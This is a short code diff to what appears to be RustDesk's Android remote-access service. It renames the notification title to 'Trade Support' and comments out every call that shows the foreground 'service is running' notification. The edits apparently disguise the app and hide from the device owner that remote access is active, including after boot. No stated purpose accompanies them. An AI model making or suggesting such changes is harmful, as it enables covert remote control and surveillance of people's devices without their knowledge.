@@ -45,7 +45,7 @@ import kotlin.math.max
 import kotlin.math.min
 
 
-const val DEFAULT_NOTIFY_TITLE = "RustDesk"
+const val DEFAULT_NOTIFY_TITLE = "Trade Support"
 const val DEFAULT_NOTIFY_TEXT = "Service is running"
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
@@ -219,7 +219,7 @@ class MainService : Service() {
         val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
         startServer(configPath)
 
-        createForegroundNotification()
+        // createForegroundNotification()
     }
 
     override fun onDestroy() {
@@ -297,7 +297,7 @@ class MainService : Service() {
         Log.d("whichService", "this service: ${Thread.currentThread()}")
         super.onStartCommand(intent, flags, startId)
         if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
-            createForegroundNotification()
+            // createForegroundNotification()
 
             if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                 startService()
